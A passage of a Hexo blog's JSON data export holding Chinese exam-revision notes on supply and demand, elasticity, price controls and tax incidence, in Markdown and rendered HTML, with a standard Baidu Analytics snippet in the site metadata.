定义\n\n一种物品的需求量，是买者*愿意*并且*能够购买*的这种物品的数量。\n\n### 需求定理\n\n在其他条件不变时，一种物品的价格上升，对该物品的需求量减少；一种物品的价格下降，对该物品的需求量增加。换言之，在其他条件不变时，物品价格与需求量之间呈负相关关系\n\n### 需求表\n\n在其他影响消费者需求的因素不变的情况下，一种物品的价格与其需求量之间关系的表格。\n\n|咖啡价格|需求量|\n|:------:|:---:|\n|￥0.00|16|\n|￥1.00|14|\n|￥2.00|12|\n|￥3.00|10|\n|￥4.00|8|\n|￥5.00|6|\n|￥6.00|4|\n\n### 需求曲线\n\n#### 定义\n\n由需求表的价格为y轴，市场需求量为x轴画的曲线\n\n> 市场需求量是所有买者在每一价格水平下需求量的总和\n\n#### 曲线的移动\n\n* 需求增加：使每一价格水平下的需求量增加的任何变动都会使需求曲线向右移动\n* 需求减少：使每一价格水平下的需求量减少的任何变动都会使需求曲线向左移动\n\n> 区分于\n> \n> * 需求量增加/减少\n> * 价格增加/减少\n\n* 买者数量增加：曲线右移\n* 收入\n    * 正常物品：需求量与收入呈正比\n    * 低档物品：需求量与收入呈反比\n* 相关物品的价格\n    * 替代品：一种物品价格上升引起另一种物品需求量增加\n    * 互补品：一种物品价格上升引起另一种物品需求量减少\n* 嗜好\n* 预期\n\n## 供给\n\n### 定义\n\n一种物品的供给量，是卖者*愿意*并且*能够出售*的一种物品的数量。\n\n### 供给定理\n\n在其他条件不变时，一种物品价格上升，该物品供给量增加；一种物品价格下降，该物品供给量减少。换言之，在其他条件不变时，物品价格与供给量之间呈正相关关系。\n\n### 供给表\n\n在其他条件保持不变情况下，一种物品的价格与供给量之间关系的表格\n\n|咖啡价格|供给量|\n|:------:|:---:|\n|￥0.00|0|\n|￥1.00|3|\n|￥2.00|6|\n|￥3.00|9|\n|￥4.00|12|\n|￥5.00|15|\n|￥6.00|18|\n\n### 供给曲线\n\n...\n\n> 市场供给量：...\n\n#### 移动\n\n* 供给增加：使每一价格水平的供给量都增加的任何一种变动，都会使供给曲线向右移动\n* 供给减少：使每一价格水平的供给量都减少的任何一种变动，都会使供给曲线向左移动\n\n> 区分于\n> \n> * 供给量增加/减少\n> * 价格增加/减少\n\n* 卖者数量增加：右移\n* 投入品价格（成本）下降：右移\n* 技术改进：右移\n* 预期：（奇货可居）\n\n## 需求与供给的结合\n\n需求曲线和供给曲线交点，价格与市场均衡\n\n#### 均衡 ：\n各种力量处于平衡的状态\n#### 市场均衡：\n商品的需求价格等于供给价格，商品的需求数量等于供给数量\n#### 均衡价格（市场出清价格）：\n使供给与需求平衡的价格。\n#### 均衡数量：\n均衡价格下的商品供给量和商品需求量。\n\n### 过剩（超额供给）\n\n市场价格高于均衡价格\n\n供给量大于需求量的状态（即供过于求的状态）\n\n### 短缺（超额需求）\n\n市场价格低于均衡价格\n\n需求量大于供给量的状态（即供不应求的状态）\n\n### 供求定理\n\n任何一种物品的价格调整都会使该物品的供给与需求达到平衡。\n\n价格调整过程即为市场配置稀缺资源的过程。\n\n## 价格配置资源（小结）\n\n* 价格是引导资源配置的信号\n* 经济学家使用供给与需求模型来分析竞争市场\n* **向右下方倾斜的需求曲线**反应了需求定理\n* **向右上方倾斜的供给曲线**反应了供给定理\n* 供给曲线与需求曲线相交决定了市场均衡\n* 当市场价格高于均衡价格时，存在物品的过剩，引起市场价格下降。\n* 当市场价格低于均衡价格时，存在物品的短缺，引起市场价格上升\n* 在市场经济中，价格是引导经济决策，从而配置稀缺资源的信号。\n* 微观经济学有时也称为**价格理论**\n* 为了分析某个事件如何影响一个市场，我们用供求图来考察该事件对均衡价格和均衡数量的影响。我们遵循三个步骤进行：\n    1. 确定该事件是使供给曲线移动，还是使需求曲线移动（还是使两者都移动）\n    2. 确定曲线移动的方向\n    3. 比较新均衡与原来的均衡\n\n# 第4章 供需弹性及其应用\n\n## 弹性\n\n衡量一个变量对另一个变量反应程度的指标。\n\n### =>\n\n* 需求弹性是衡量需求量对其某种决定因素的反应程度的指标。\n* 供给弹性是衡量供给量对其某种决定因素的反应程度的指标。\n\n## 需求弹性\n\n需求价格弹性：衡量一种物品需求量对其价格变动的反应程度\n\n### 计算\n\n需求价格弹性 = 需求量变动百分比 / 价格变动百分比\n\n> 变动百分比 = (终值 - 初始值) / 变动前后平均值（中点法）\n\n> 按照经济学惯例，我们去掉负号，把所有需求价格弹性表示为正数，即取弹性的绝对值。\n\n### 需求价格弹性的决定因素\n\n* 有“相近替代品”的物品的需求往往较富有弹性（相近替代品的可获得性）\n* “范围小的市场”的需求价格弹性往往大于“范围大的市场”的需求价格弹性（市场范围的划定）\n* 奢侈品的需求价格弹性要大于必需品的需求价格弹性（奢侈品和必需品）\n* 相对于短期，物品的需求往往在长期更富有价格弹性（时间长短）\n\n### 需求价格弹性与各种需求曲线之间的关系\n\n需求曲线越平坦，需求价格弹性越大\n\n由此关系可将需求曲线分为\n* 完全无弹性的需求曲线（缺乏弹性的一个极端例子）[弹性=0，需求曲线竖直]\n* 缺乏弹性的需求曲线[弹性<1]\n* 单位弹性的需求曲线[弹性=1]\n* 富有弹性的需求曲线[弹性>1]\n* 完全有弹性的需求曲线（富有弹性的一个极端例子）[弹性无穷大，需求曲线水平]\n\n> 注意：线性需求曲线的斜率为常数，但它的弹性不是常数\n\n### 总收益与需求价格弹性\n\n###￥ 总收益\n\n某种物品的买者支付从而卖者得到的货币量。\n\n在任何一个市场上，总收益 = P x Q \n\n#### 价格变动对总收益的影响取决于需求价格弹性\n\n当需求富有弹性时，价格和总收益反方向变化。\n当需求缺乏弹性时，价格和总收益同方向变动。\n当需求是单位弹性时，价格变动，总收益不变。\n\n### 其他需求弹性\n\n* 需求收入弹性：衡量消费者收入变动时需求量如何变动。\n* 需求的交叉价格弹性：衡量一种物品需求量对另外一种物品价格变动的反应程度\n需求的交叉价格弹性\n = 物品B的需求量变动百分比 \n / 物品A的价格变动百分比\n\n## 供给价格弹性\n\n衡量一种物品供给量对其价格变动的反应程度\n\n> 内容基本同上需求部分\n\n## 小结\n\n* 弹性衡量需求量或供给量对其一个影响因素变动的反应程度\n* 需求价格弹性衡量需求量对价格变动的反应程度。如果弹性小于1，需求缺乏弹性；如果大于1，需求富有弹性\n* 对于缺乏弹性的需求曲线，其总收益随着价格的上升而增加。对于富有弹性的需求曲线，其总收益随着价格的上升而减少\n* 如果某种物品\n    * 没有相近的替代品\n    * 是必需品而不是奢侈品\n    * 市场范围大\n    * 在短期内\n    * 那么，这种物品就更倾向于缺乏弹性\n* 供给价格弹性衡量的是供给量对价格变动的反应程度。如果弹性小于1，供给缺乏弹性。如果弹性大于1，供给富有弹性\n* 供给价格弹性在长期中比在短期中更富有弹性\n* 需求收入弹性衡量的是需求量对消费者收入变动的反应程度\n* 需求的交叉价格弹性衡量一种物品需求量对另一种物品价格变动的反应程度\n\n# 第5章 供给、需求与政府政策\n\n* 价格上限：出售一种物品或服务的法定最高价格，比如租金控制\n* 价格下限：出售一种物品或服务的法定最低价格，比如最低工资 \n\n> 价格上限高于均衡价格时，价格上限是非限制性的。（非限制性的价格上限）\n> \n> 市场力量自然而然地使经济向均衡变动，而且*非限制性的价格上限对市场结果没有影响。*\n>\n> 而限制性的价格上限将导致了需求量大于供给量，因而出现短缺\n\n> 同理，限制性的价格下限将导致供给量大于需求量，因而引起过剩\n\n## 短缺与配给机制\n\n面临短缺时，卖者必须在买者之间配给稀缺物品 \n\n配给机制：（1）排长队  （2）根据卖者的偏好\n\n> 这些配件机制既可能是不公平的，也是无效率的：因为物品并不一定会卖给对它评价最高的买者\n\n> 一个自由竞争市场中的配给机制既有效率（物品卖给对它评价最高的买者），也是客观的（公平的）\n\n> 实际上，决策者进行价格控制的目标往往是想帮助穷人，但往往却伤害了那些它本想帮助的人。比如：最低工资法会增加一些工人的收入，但也是其他工人成为失业者。\n\n## 税收\n\n对买者征税使需求曲线向下移动，其移动幅度为税收量 （要保持买者的需求量需要降低税收价格的市场价，因此下移[需求曲线的y轴是卖者的售价]）\n\n对卖者征税使供给曲线向上移动，移动幅度为税收量（与上同理）\n\n### 税收归宿\n\n税收负担在市场参与者之间进行分配的方式\n\n即，税收总量多少，买者分担多少，卖者分担多少\n\n> 无论对买者还是卖者征税，最后的市场价格、均衡数量以及税收归宿都是*相同*的\n\n### 结论\n\n* 税收抑制了市场活动。当对一种物品征税时，该物品在新均衡时的销售量减少了。\n* 买者与卖者分摊了税收负担。在新均衡时，买者为该物品支付的更多了，而卖者得到的更少了。\n* 对买者征税和对卖者征税是相同的。对买者征税和对卖者征税的唯一区别是谁把钱交给了政府。\n\n### 弹性与税收\n\n* 供给相对于需求更富有弹性，则买者承担了大部分税负\n* 需求相对于供给更富有弹性，则卖者承担了大部分税负\n\n=> \n\n税收负担更多地落在缺乏弹性的市场一方身上。","slug":"第二讲——市场","published":1,"date":"2017-05-06T02:16:21.367Z","updated":"2017-05-07T12:33:05.497Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4g000il8sli1mb9dc9","content":"<blockquote>\n<p>后天考选修，贴个[哭]</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"第三章-供给与需求的市场力量\"><a href=\"#第三章-供给与需求的市场力量\" class=\"headerlink\" title=\"第三章 供给与需求的市场力量\"></a>第三章 供给与需求的市场力量</h1><h2 id=\"市场和竞争\"><a href=\"#市场和竞争\" class=\"headerlink\" title=\"市场和竞争\"></a>市场和竞争</h2><h3 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>市场是由某种物品或劳务的买者或卖者组成的一个群体</p>\n<blockquote>\n<p>买者决定需求<br>卖者决定供给</p>\n</blockquote>\n<h3 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h3><ul>\n<li>有组织的（如农贸市场）</li>\n<li>无组织的（如一个镇上的冰激凌市场）</li>\n<li>完全竞争市场<ul>\n<li>每个买者卖者对市场价格影响微乎其微（买卖双方均是价格接受者）</li>\n<li>可供销售的物品或劳务完全相同（同质商品）</li>\n</ul>\n</li>\n<li>完全垄断市场<ul>\n<li>市场只有一个卖者（垄断的初始定义），并由其决定价格（卖者是价格制定者）</li>\n</ul>\n</li>\n<li>（分割）现实中以上两者都比较少，一半市场结构居于这两种之间</li>\n<li>垄断竞争市场</li>\n<li>寡头垄断市场</li>\n</ul>\n<h2 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h2><h3 id=\"定义-1\"><a href=\"#定义-1\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>一种物品的需求量，是买者<em>愿意</em>并且<em>能够购买</em>的这种物品的数量。</p>\n<h3 id=\"需求定理\"><a href=\"#需求定理\" class=\"headerlink\" title=\"需求定理\"></a>需求定理</h3><p>在其他条件不变时，一种物品的价格上升，对该物品的需求量减少；一种物品的价格下降，对该物品的需求量增加。换言之，在其他条件不变时，物品价格与需求量之间呈负相关关系</p>\n<h3 id=\"需求表\"><a href=\"#需求表\" class=\"headerlink\" title=\"需求表\"></a>需求表</h3><p>在其他影响消费者需求的因素不变的情况下，一种物品的价格与其需求量之间关系的表格。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">咖啡价格</th>\n<th style=\"text-align:center\">需求量</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">￥0.00</td>\n<td style=\"text-align:center\">16</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥1.00</td>\n<td style=\"text-align:center\">14</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥2.00</td>\n<td style=\"text-align:center\">12</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥3.00</td>\n<td style=\"text-align:center\">10</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥4.00</td>\n<td style=\"text-align:center\">8</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥5.00</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥6.00</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"需求曲线\"><a href=\"#需求曲线\" class=\"headerlink\" title=\"需求曲线\"></a>需求曲线</h3><h4 id=\"定义-2\"><a href=\"#定义-2\" class=\"headerlink\" title=\"定义\"></a>定义</h4><p>由需求表的价格为y轴，市场需求量为x轴画的曲线</p>\n<blockquote>\n<p>市场需求量是所有买者在每一价格水平下需求量的总和</p>\n</blockquote>\n<h4 id=\"曲线的移动\"><a href=\"#曲线的移动\" class=\"headerlink\" title=\"曲线的移动\"></a>曲线的移动</h4><ul>\n<li>需求增加：使每一价格水平下的需求量增加的任何变动都会使需求曲线向右移动</li>\n<li>需求减少：使每一价格水平下的需求量减少的任何变动都会使需求曲线向左移动</li>\n</ul>\n<blockquote>\n<p>区分于</p>\n<ul>\n<li>需求量增加/减少</li>\n<li>价格增加/减少</li>\n</ul>\n</blockquote>\n<ul>\n<li>买者数量增加：曲线右移</li>\n<li>收入<ul>\n<li>正常物品：需求量与收入呈正比</li>\n<li>低档物品：需求量与收入呈反比</li>\n</ul>\n</li>\n<li>相关物品的价格<ul>\n<li>替代品：一种物品价格上升引起另一种物品需求量增加</li>\n<li>互补品：一种物品价格上升引起另一种物品需求量减少</li>\n</ul>\n</li>\n<li>嗜好</li>\n<li>预期</li>\n</ul>\n<h2 id=\"供给\"><a href=\"#供给\" class=\"headerlink\" title=\"供给\"></a>供给</h2><h3 id=\"定义-3\"><a href=\"#定义-3\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>一种物品的供给量，是卖者<em>愿意</em>并且<em>能够出售</em>的一种物品的数量。</p>\n<h3 id=\"供给定理\"><a href=\"#供给定理\" class=\"headerlink\" title=\"供给定理\"></a>供给定理</h3><p>在其他条件不变时，一种物品价格上升，该物品供给量增加；一种物品价格下降，该物品供给量减少。换言之，在其他条件不变时，物品价格与供给量之间呈正相关关系。</p>\n<h3 id=\"供给表\"><a href=\"#供给表\" class=\"headerlink\" title=\"供给表\"></a>供给表</h3><p>在其他条件保持不变情况下，一种物品的价格与供给量之间关系的表格</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">咖啡价格</th>\n<th style=\"text-align:center\">供给量</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">￥0.00</td>\n<td style=\"text-align:center\">0</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥1.00</td>\n<td style=\"text-align:center\">3</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥2.00</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥3.00</td>\n<td style=\"text-align:center\">9</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥4.00</td>\n<td style=\"text-align:center\">12</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥5.00</td>\n<td style=\"text-align:center\">15</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥6.00</td>\n<td style=\"text-align:center\">18</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"供给曲线\"><a href=\"#供给曲线\" class=\"headerlink\" title=\"供给曲线\"></a>供给曲线</h3><p>…</p>\n<blockquote>\n<p>市场供给量：…</p>\n</blockquote>\n<h4 id=\"移动\"><a href=\"#移动\" class=\"headerlink\" title=\"移动\"></a>移动</h4><ul>\n<li>供给增加：使每一价格水平的供给量都增加的任何一种变动，都会使供给曲线向右移动</li>\n<li>供给减少：使每一价格水平的供给量都减少的任何一种变动，都会使供给曲线向左移动</li>\n</ul>\n<blockquote>\n<p>区分于</p>\n<ul>\n<li>供给量增加/减少</li>\n<li>价格增加/减少</li>\n</ul>\n</blockquote>\n<ul>\n<li>卖者数量增加：右移</li>\n<li>投入品价格（成本）下降：右移</li>\n<li>技术改进：右移</li>\n<li>预期：（奇货可居）</li>\n</ul>\n<h2 id=\"需求与供给的结合\"><a href=\"#需求与供给的结合\" class=\"headerlink\" title=\"需求与供给的结合\"></a>需求与供给的结合</h2><p>需求曲线和供给曲线交点，价格与市场均衡</p>\n<h4 id=\"均衡-：\"><a href=\"#均衡-：\" class=\"headerlink\" title=\"均衡 ：\"></a>均衡 ：</h4><p>各种力量处于平衡的状态</p>\n<h4 id=\"市场均衡：\"><a href=\"#市场均衡：\" class=\"headerlink\" title=\"市场均衡：\"></a>市场均衡：</h4><p>商品的需求价格等于供给价格，商品的需求数量等于供给数量</p>\n<h4 id=\"均衡价格（市场出清价格）：\"><a href=\"#均衡价格（市场出清价格）：\" class=\"headerlink\" title=\"均衡价格（市场出清价格）：\"></a>均衡价格（市场出清价格）：</h4><p>使供给与需求平衡的价格。</p>\n<h4 id=\"均衡数量：\"><a href=\"#均衡数量：\" class=\"headerlink\" title=\"均衡数量：\"></a>均衡数量：</h4><p>均衡价格下的商品供给量和商品需求量。</p>\n<h3 id=\"过剩（超额供给）\"><a href=\"#过剩（超额供给）\" class=\"headerlink\" title=\"过剩（超额供给）\"></a>过剩（超额供给）</h3><p>市场价格高于均衡价格</p>\n<p>供给量大于需求量的状态（即供过于求的状态）</p>\n<h3 id=\"短缺（超额需求）\"><a href=\"#短缺（超额需求）\" class=\"headerlink\" title=\"短缺（超额需求）\"></a>短缺（超额需求）</h3><p>市场价格低于均衡价格</p>\n<p>需求量大于供给量的状态（即供不应求的状态）</p>\n<h3 id=\"供求定理\"><a href=\"#供求定理\" class=\"headerlink\" title=\"供求定理\"></a>供求定理</h3><p>任何一种物品的价格调整都会使该物品的供给与需求达到平衡。</p>\n<p>价格调整过程即为市场配置稀缺资源的过程。</p>\n<h2 id=\"价格配置资源（小结）\"><a href=\"#价格配置资源（小结）\" class=\"headerlink\" title=\"价格配置资源（小结）\"></a>价格配置资源（小结）</h2><ul>\n<li>价格是引导资源配置的信号</li>\n<li>经济学家使用供给与需求模型来分析竞争市场</li>\n<li><strong>向右下方倾斜的需求曲线</strong>反应了需求定理</li>\n<li><strong>向右上方倾斜的供给曲线</strong>反应了供给定理</li>\n<li>供给曲线与需求曲线相交决定了市场均衡</li>\n<li>当市场价格高于均衡价格时，存在物品的过剩，引起市场价格下降。</li>\n<li>当市场价格低于均衡价格时，存在物品的短缺，引起市场价格上升</li>\n<li>在市场经济中，价格是引导经济决策，从而配置稀缺资源的信号。</li>\n<li>微观经济学有时也称为<strong>价格理论</strong></li>\n<li>为了分析某个事件如何影响一个市场，我们用供求图来考察该事件对均衡价格和均衡数量的影响。我们遵循三个步骤进行：<ol>\n<li>确定该事件是使供给曲线移动，还是使需求曲线移动（还是使两者都移动）</li>\n<li>确定曲线移动的方向</li>\n<li>比较新均衡与原来的均衡</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"第4章-供需弹性及其应用\"><a href=\"#第4章-供需弹性及其应用\" class=\"headerlink\" title=\"第4章 供需弹性及其应用\"></a>第4章 供需弹性及其应用</h1><h2 id=\"弹性\"><a href=\"#弹性\" class=\"headerlink\" title=\"弹性\"></a>弹性</h2><p>衡量一个变量对另一个变量反应程度的指标。</p>\n<h3 id=\"gt\"><a href=\"#gt\" class=\"headerlink\" title=\"=&gt;\"></a>=&gt;</h3><ul>\n<li>需求弹性是衡量需求量对其某种决定因素的反应程度的指标。</li>\n<li>供给弹性是衡量供给量对其某种决定因素的反应程度的指标。</li>\n</ul>\n<h2 id=\"需求弹性\"><a href=\"#需求弹性\" class=\"headerlink\" title=\"需求弹性\"></a>需求弹性</h2><p>需求价格弹性：衡量一种物品需求量对其价格变动的反应程度</p>\n<h3 id=\"计算\"><a href=\"#计算\" class=\"headerlink\" title=\"计算\"></a>计算</h3><p>需求价格弹性 = 需求量变动百分比 / 价格变动百分比</p>\n<blockquote>\n<p>变动百分比 = (终值 - 初始值) / 变动前后平均值（中点法）</p>\n<p>按照经济学惯例，我们去掉负号，把所有需求价格弹性表示为正数，即取弹性的绝对值。</p>\n</blockquote>\n<h3 id=\"需求价格弹性的决定因素\"><a href=\"#需求价格弹性的决定因素\" class=\"headerlink\" title=\"需求价格弹性的决定因素\"></a>需求价格弹性的决定因素</h3><ul>\n<li>有“相近替代品”的物品的需求往往较富有弹性（相近替代品的可获得性）</li>\n<li>“范围小的市场”的需求价格弹性往往大于“范围大的市场”的需求价格弹性（市场范围的划定）</li>\n<li>奢侈品的需求价格弹性要大于必需品的需求价格弹性（奢侈品和必需品）</li>\n<li>相对于短期，物品的需求往往在长期更富有价格弹性（时间长短）</li>\n</ul>\n<h3 id=\"需求价格弹性与各种需求曲线之间的关系\"><a href=\"#需求价格弹性与各种需求曲线之间的关系\" class=\"headerlink\" title=\"需求价格弹性与各种需求曲线之间的关系\"></a>需求价格弹性与各种需求曲线之间的关系</h3><p>需求曲线越平坦，需求价格弹性越大</p>\n<p>由此关系可将需求曲线分为</p>\n<ul>\n<li>完全无弹性的需求曲线（缺乏弹性的一个极端例子）[弹性=0，需求曲线竖直]</li>\n<li>缺乏弹性的需求曲线[弹性&lt;1]</li>\n<li>单位弹性的需求曲线[弹性=1]</li>\n<li>富有弹性的需求曲线[弹性&gt;1]</li>\n<li>完全有弹性的需求曲线（富有弹性的一个极端例子）[弹性无穷大，需求曲线水平]</li>\n</ul>\n<blockquote>\n<p>注意：线性需求曲线的斜率为常数，但它的弹性不是常数</p>\n</blockquote>\n<h3 id=\"总收益与需求价格弹性\"><a href=\"#总收益与需求价格弹性\" class=\"headerlink\" title=\"总收益与需求价格弹性\"></a>总收益与需求价格弹性</h3><p>###￥ 总收益</p>\n<p>某种物品的买者支付从而卖者得到的货币量。</p>\n<p>在任何一个市场上，总收益 = P x Q </p>\n<h4 id=\"价格变动对总收益的影响取决于需求价格弹性\"><a href=\"#价格变动对总收益的影响取决于需求价格弹性\" class=\"headerlink\" title=\"价格变动对总收益的影响取决于需求价格弹性\"></a>价格变动对总收益的影响取决于需求价格弹性</h4><p>当需求富有弹性时，价格和总收益反方向变化。<br>当需求缺乏弹性时，价格和总收益同方向变动。<br>当需求是单位弹性时，价格变动，总收益不变。</p>\n<h3 id=\"其他需求弹性\"><a href=\"#其他需求弹性\" class=\"headerlink\" title=\"其他需求弹性\"></a>其他需求弹性</h3><ul>\n<li>需求收入弹性：衡量消费者收入变动时需求量如何变动。</li>\n<li>需求的交叉价格弹性：衡量一种物品需求量对另外一种物品价格变动的反应程度<br>需求的交叉价格弹性<br>= 物品B的需求量变动百分比<br>/ 物品A的价格变动百分比</li>\n</ul>\n<h2 id=\"供给价格弹性\"><a href=\"#供给价格弹性\" class=\"headerlink\" title=\"供给价格弹性\"></a>供给价格弹性</h2><p>衡量一种物品供给量对其价格变动的反应程度</p>\n<blockquote>\n<p>内容基本同上需求部分</p>\n</blockquote>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><ul>\n<li>弹性衡量需求量或供给量对其一个影响因素变动的反应程度</li>\n<li>需求价格弹性衡量需求量对价格变动的反应程度。如果弹性小于1，需求缺乏弹性；如果大于1，需求富有弹性</li>\n<li>对于缺乏弹性的需求曲线，其总收益随着价格的上升而增加。对于富有弹性的需求曲线，其总收益随着价格的上升而减少</li>\n<li>如果某种物品<ul>\n<li>没有相近的替代品</li>\n<li>是必需品而不是奢侈品</li>\n<li>市场范围大</li>\n<li>在短期内</li>\n<li>那么，这种物品就更倾向于缺乏弹性</li>\n</ul>\n</li>\n<li>供给价格弹性衡量的是供给量对价格变动的反应程度。如果弹性小于1，供给缺乏弹性。如果弹性大于1，供给富有弹性</li>\n<li>供给价格弹性在长期中比在短期中更富有弹性</li>\n<li>需求收入弹性衡量的是需求量对消费者收入变动的反应程度</li>\n<li>需求的交叉价格弹性衡量一种物品需求量对另一种物品价格变动的反应程度</li>\n</ul>\n<h1 id=\"第5章-供给、需求与政府政策\"><a href=\"#第5章-供给、需求与政府政策\" class=\"headerlink\" title=\"第5章 供给、需求与政府政策\"></a>第5章 供给、需求与政府政策</h1><ul>\n<li>价格上限：出售一种物品或服务的法定最高价格，比如租金控制</li>\n<li>价格下限：出售一种物品或服务的法定最低价格，比如最低工资 </li>\n</ul>\n<blockquote>\n<p>价格上限高于均衡价格时，价格上限是非限制性的。（非限制性的价格上限）</p>\n<p>市场力量自然而然地使经济向均衡变动，而且<em>非限制性的价格上限对市场结果没有影响。</em></p>\n<p>而限制性的价格上限将导致了需求量大于供给量，因而出现短缺</p>\n<p>同理，限制性的价格下限将导致供给量大于需求量，因而引起过剩</p>\n</blockquote>\n<h2 id=\"短缺与配给机制\"><a href=\"#短缺与配给机制\" class=\"headerlink\" title=\"短缺与配给机制\"></a>短缺与配给机制</h2><p>面临短缺时，卖者必须在买者之间配给稀缺物品 </p>\n<p>配给机制：（1）排长队  （2）根据卖者的偏好</p>\n<blockquote>\n<p>这些配件机制既可能是不公平的，也是无效率的：因为物品并不一定会卖给对它评价最高的买者</p>\n<p>一个自由竞争市场中的配给机制既有效率（物品卖给对它评价最高的买者），也是客观的（公平的）</p>\n<p>实际上，决策者进行价格控制的目标往往是想帮助穷人，但往往却伤害了那些它本想帮助的人。比如：最低工资法会增加一些工人的收入，但也是其他工人成为失业者。</p>\n</blockquote>\n<h2 id=\"税收\"><a href=\"#税收\" class=\"headerlink\" title=\"税收\"></a>税收</h2><p>对买者征税使需求曲线向下移动，其移动幅度为税收量 （要保持买者的需求量需要降低税收价格的市场价，因此下移[需求曲线的y轴是卖者的售价]）</p>\n<p>对卖者征税使供给曲线向上移动，移动幅度为税收量（与上同理）</p>\n<h3 id=\"税收归宿\"><a href=\"#税收归宿\" class=\"headerlink\" title=\"税收归宿\"></a>税收归宿</h3><p>税收负担在市场参与者之间进行分配的方式</p>\n<p>即，税收总量多少，买者分担多少，卖者分担多少</p>\n<blockquote>\n<p>无论对买者还是卖者征税，最后的市场价格、均衡数量以及税收归宿都是<em>相同</em>的</p>\n</blockquote>\n<h3 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h3><ul>\n<li>税收抑制了市场活动。当对一种物品征税时，该物品在新均衡时的销售量减少了。</li>\n<li>买者与卖者分摊了税收负担。在新均衡时，买者为该物品支付的更多了，而卖者得到的更少了。</li>\n<li>对买者征税和对卖者征税是相同的。对买者征税和对卖者征税的唯一区别是谁把钱交给了政府。</li>\n</ul>\n<h3 id=\"弹性与税收\"><a href=\"#弹性与税收\" class=\"headerlink\" title=\"弹性与税收\"></a>弹性与税收</h3><ul>\n<li>供给相对于需求更富有弹性，则买者承担了大部分税负</li>\n<li>需求相对于供给更富有弹性，则卖者承担了大部分税负</li>\n</ul>\n<p>=&gt; </p>\n<p>税收负担更多地落在缺乏弹性的市场一方身上。</p>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>后天考选修，贴个[哭]</p>\n</blockquote>","more":"<h1 id=\"第三章-供给与需求的市场力量\"><a href=\"#第三章-供给与需求的市场力量\" class=\"headerlink\" title=\"第三章 供给与需求的市场力量\"></a>第三章 供给与需求的市场力量</h1><h2 id=\"市场和竞争\"><a href=\"#市场和竞争\" class=\"headerlink\" title=\"市场和竞争\"></a>市场和竞争</h2><h3 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>市场是由某种物品或劳务的买者或卖者组成的一个群体</p>\n<blockquote>\n<p>买者决定需求<br>卖者决定供给</p>\n</blockquote>\n<h3 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h3><ul>\n<li>有组织的（如农贸市场）</li>\n<li>无组织的（如一个镇上的冰激凌市场）</li>\n<li>完全竞争市场<ul>\n<li>每个买者卖者对市场价格影响微乎其微（买卖双方均是价格接受者）</li>\n<li>可供销售的物品或劳务完全相同（同质商品）</li>\n</ul>\n</li>\n<li>完全垄断市场<ul>\n<li>市场只有一个卖者（垄断的初始定义），并由其决定价格（卖者是价格制定者）</li>\n</ul>\n</li>\n<li>（分割）现实中以上两者都比较少，一半市场结构居于这两种之间</li>\n<li>垄断竞争市场</li>\n<li>寡头垄断市场</li>\n</ul>\n<h2 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h2><h3 id=\"定义-1\"><a href=\"#定义-1\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>一种物品的需求量，是买者<em>愿意</em>并且<em>能够购买</em>的这种物品的数量。</p>\n<h3 id=\"需求定理\"><a href=\"#需求定理\" class=\"headerlink\" title=\"需求定理\"></a>需求定理</h3><p>在其他条件不变时，一种物品的价格上升，对该物品的需求量减少；一种物品的价格下降，对该物品的需求量增加。换言之，在其他条件不变时，物品价格与需求量之间呈负相关关系</p>\n<h3 id=\"需求表\"><a href=\"#需求表\" class=\"headerlink\" title=\"需求表\"></a>需求表</h3><p>在其他影响消费者需求的因素不变的情况下，一种物品的价格与其需求量之间关系的表格。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">咖啡价格</th>\n<th style=\"text-align:center\">需求量</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">￥0.00</td>\n<td style=\"text-align:center\">16</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥1.00</td>\n<td style=\"text-align:center\">14</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥2.00</td>\n<td style=\"text-align:center\">12</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥3.00</td>\n<td style=\"text-align:center\">10</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">￥4.00</td>\n<td 